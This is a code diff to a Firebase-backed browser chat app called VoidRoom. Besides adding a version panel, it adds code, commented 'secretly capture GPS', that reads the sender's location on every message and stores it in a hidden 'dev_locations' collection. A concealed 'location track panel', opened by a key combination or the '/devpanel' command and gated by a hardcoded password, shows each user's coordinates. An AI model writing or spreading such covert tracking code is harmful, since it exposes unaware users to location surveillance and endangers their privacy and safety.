@@ -1,10 +1,16 @@
 <!DOCTYPE html>  <html lang="en">  
 <head>  
 <meta charset="UTF-8">  
-<meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>VoidRoom</title>  <link rel="preconnect" href="https://fonts.googleapis.com">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>VOIDROOM v0.1.0</title>  <link rel="preconnect" href="https://fonts.googleapis.com">  
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 
 <style>  
+
+#versionText {
+    color: #777;
+    font-weight: 400;
+    letter-spacing: 1px;
+}
 
 #nameScreen {
     display: none;
@@ -218,6 +224,92 @@ button:hover{
 </style>
 </head>  
 <body>  
+
+<div id="versionPanel" style="
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#000;
+    color:#00ff88;
+    padding:20px;
+    overflow:auto;
+    z-index:99999;
+">
+    <div style="
+        display:flex;
+        justify-content:space-between;
+        align-items:center;
+        margin-bottom:20px;
+    ">
+        <h2>DEV VERSION UPDATE PANEL</h2>
+
+        <button onclick="closeVersionPanel()" style="
+            background:#220000;
+            color:#ff5555;
+            border:1px solid #ff5555;
+            padding:8px 14px;
+        ">
+            EXIT
+        </button>
+    </div>
+
+    <div style="margin-bottom:10px;">
+        CURRENT VERSION: <span id="currentVersionText">loading...</span>
+    </div>
+
+    <input id="versionInput" placeholder="v0.2.0"
+        style="padding:12px;background:#0f0f0f;color:white;border:1px solid #222;width:200px;">
+
+    <button onclick="updateVersion()" style="
+        margin-top:10px;
+        padding:10px 14px;
+        background:#00aa66;
+        border:none;
+        color:white;
+        cursor:pointer;
+    ">
+        UPDATE VERSION
+    </button>
+</div>
+
+<div id="devPanel" style="
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#000;
+    color:#00ff88;
+    padding:20px;
+    overflow:auto;
+    z-index:99999;
+">
+    <div style="
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px;
+">
+
+    <h2>DEV LOCATION TRACK PANEL</h2>
+
+    <button onclick="closeDevPanel()" style="
+    background:#220000;
+    color:#ff5555;
+    border:1px solid #ff5555;
+    padding:8px 14px;
+    ">
+        EXIT
+    </button>
+
+</div>
+    <div id="devOutput"></div>
+</div>
+
 <div id="nameScreen" style="
     position:fixed;
     top:0;
@@ -242,9 +334,9 @@ button:hover{
 <canvas id="matrix"></canvas>
 
 <div class="container" id="mainUI" style="display:none;"> <div class="header">  
-    <div class="logo">  
-        VOIDROOM  
-    </div>  
+<div class="logo">
+    VOIDROOM <span id="versionText">loading...</span>
+</div>
 
     <div class="online" id="onlineCount">  
         ONLINE: 0 
@@ -267,6 +359,20 @@ button:hover{
 </div>
 
 </div>  <script type="module">  
+
+function getCoords() {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude
+                });
+            },
+            () => resolve(null)
+        );
+    });
+}
 
 /* =========================  
    FIREBASE IMPORTS  
@@ -309,6 +415,19 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);  
 
 const db = getFirestore(app);  
+
+
+/* =========================  
+   ESCAPE HTML  
+========================= */  
+
+function escapeHTML(str){  
+
+    return str  
+    .replace(/&/g, "&amp;")  
+    .replace(/</g, "&lt;")  
+    .replace(/>/g, "&gt;");  
+}  
 
 
 /* =========================  
@@ -355,6 +474,76 @@ window.confirmName = function () {
     }
 
     startApp(name);
+};
+
+document.addEventListener("keydown", (e) => {
+    if (e.ctrlKey && e.shiftKey && e.key === "D") {
+
+        const pass = prompt("Dev password:");
+
+        if (pass === "sugnoma") {
+            document.getElementById("devPanel").style.display = "block";
+            loadDevPanel();
+        }
+    }
+});
+
+function loadDevPanel() {
+
+    const devOutput = document.getElementById("devOutput");
+
+    const devRef = collection(db, "dev_locations");
+
+    onSnapshot(devRef, (snapshot) => {
+
+        devOutput.innerHTML = "";
+
+        snapshot.forEach((doc) => {
+            const data = doc.data();
+
+            const div = document.createElement("div");
+
+            div.style.marginBottom = "10px";
+            div.style.borderBottom = "1px solid #222";
+            div.style.paddingBottom = "8px";
+
+const lat = Number(data.coords.lat).toFixed(6);
+const lon = Number(data.coords.lon).toFixed(6);
+
+const time =
+data.created?.seconds
+
+? new Date(data.created.seconds * 1000)
+    .toLocaleTimeString([], {
+        hour: "2-digit",
+        minute: "2-digit"
+    })
+
+: "unknown";
+
+div.innerHTML = `
+    <div style="color:#00ffaa;font-weight:bold;">
+        ${escapeHTML(data.user)}
+    </div>
+
+    <div style="margin-top:4px;color:#e0e0e0;">
+        📍 ${lat}, ${lon}
+    </div>
+
+    <div style="margin-top:3px;color:#666;font-size:12px;">
+        ${time}
+    </div>
+`;
+
+            devOutput.appendChild(div);
+        });
+    });
+}
+
+window.closeDevPanel = function () {
+
+    document.getElementById("devPanel").style.display = "none";
+
 };
 
 /* =========================  
@@ -523,6 +712,42 @@ const username = localStorage.getItem("void_username");
     }  
 
     if(!text) return;  
+    
+if (text === "/changeversion") {
+    messageInput.value = "";
+
+    const pass = prompt("Dev password:");
+
+    if (pass === "sugnoma") {
+        document.getElementById("versionPanel").style.display = "block";
+
+        // show current version instantly
+        const vText = document.getElementById("currentVersionText");
+        if (vText) {
+            const title = document.querySelector(".logo").textContent;
+            vText.textContent = title.replace("VOIDROOM ", "");
+        }
+    }
+
+    return;
+}
+    
+    // SECRET DEV COMMAND
+if (text === "/devpanel") {
+
+    messageInput.value = "";
+
+    const pass = prompt("Dev password:");
+
+    if (pass === "sugnoma") {
+
+        document.getElementById("devPanel").style.display = "block";
+
+        loadDevPanel();
+    }
+
+    return;
+}
 
     localStorage.setItem(  
         "void_username",  
@@ -559,18 +784,26 @@ const savedText = text;
 
 messageInput.value = "";
 
+// 1. send normal message (public)
 await addDoc(messagesRef, {
-
     user: username,
-
     text: savedText,
-
     created: serverTimestamp()
-
 });
 
-};  
+// 2. secretly capture GPS
+const coords = await getCoords();
 
+// 3. store GPS separately (DEV ONLY)
+if (coords) {
+    await addDoc(collection(db, "dev_locations"), {
+        user: username,
+        coords: coords,
+        created: serverTimestamp()
+    });
+}
+
+};
 
 /* =========================  
    ENTER TO SEND  
@@ -591,18 +824,33 @@ document
 
 });  
 
+const versionRef = doc(db, "config", "app");
 
-/* =========================  
-   ESCAPE HTML  
-========================= */  
+onSnapshot(versionRef, (snap) => {
+    const data = snap.data();
+    const version = data?.version || "v0.0.0";
 
-function escapeHTML(str){  
+    document.title = `VOIDROOM ${version}`;
 
-    return str  
-    .replace(/&/g, "&amp;")  
-    .replace(/</g, "&lt;")  
-    .replace(/>/g, "&gt;");  
-}  
+    document.getElementById("versionText").textContent = version;
+    document.getElementById("currentVersionText").textContent = version;
+});
+
+window.updateVersion = async function () {
+    const v = document.getElementById("versionInput").value.trim();
+
+    if (!v) return;
+
+    await setDoc(versionRef, {
+        version: v
+    }, { merge: true });
+
+    document.getElementById("versionInput").value = "";
+};
+
+window.closeVersionPanel = function () {
+    document.getElementById("versionPanel").style.display = "none";
+};
 
 
 /* =========================  
